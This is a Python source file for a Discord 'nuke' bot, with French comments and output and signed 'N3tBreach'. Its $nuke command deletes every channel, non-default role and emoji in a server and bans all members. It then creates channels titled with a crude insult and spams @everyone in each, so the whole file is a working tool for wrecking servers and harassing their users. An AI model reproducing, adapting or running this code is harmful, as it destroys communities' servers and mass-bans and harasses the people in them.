import discord
from discord.ext import commands
import asyncio
import time


intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='$', intents=intents)


bot.remove_command("help")

#N3tBreach le plus beau
@bot.event
async def on_ready():
    print("Je baise edzzer")
#N3tBreach le plus beau    

@bot.event
async def on_guild_join(guild):
    print(f"J'ai join {guild.name}")


@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    tasks = []

    
    for channel in guild.channels:
        tasks.append(delete_channel(channel))
    
   
    for role in guild.roles:
        if role.name != "@everyone":  
            tasks.append(delete_role(role))
    
   
    for member in guild.members:
        tasks.append(ban_member(guild, member))
    
  
    for emoji in guild.emojis:
        tasks.append(delete_emoji(emoji))

  
    await asyncio.gather(*tasks)
    print("On les a bz avec succès!")


async def delete_channel(channel):
    try:
        await channel.delete()
        print(f"{channel.name} supprimé")
    except Exception as e:
        print(f"Erreur en supprimant {channel.name}: {e}")
    
   
    try:
        new_channel = await channel.guild.create_text_channel("by N3tBreach Jte bz ta mère")
        for i in range(20):
            await new_channel.send("@everyone")
        print(f"{new_channel.name} créé")
    except Exception as e:
        print(f"erreur: {e}")

   
    await asyncio.sleep(0.1)


async def delete_role(role):
    try:
        await role.delete()
        print(f"{role.name} supprimé")
    except Exception as e:
        print(f"Erreur en supprimant {role.name}: {e}")
    
    
    await asyncio.sleep(0.1)


async def ban_member(guild, member):
    try:
        await guild.ban(member)
        print(f"{member.name} banni")
    except Exception as e:
        print(f"Erreur {member.name}: {e}")
    
    
    await asyncio.sleep(0.1)


async def delete_emoji(emoji):
    try:
        await emoji.delete()
        print(f"{emoji.name} supprimé")
    except Exception as e:
        print(f"Erreur {emoji.name}: {e}")
    
    
    await asyncio.sleep(0.1)


bot.run("ton token mec")
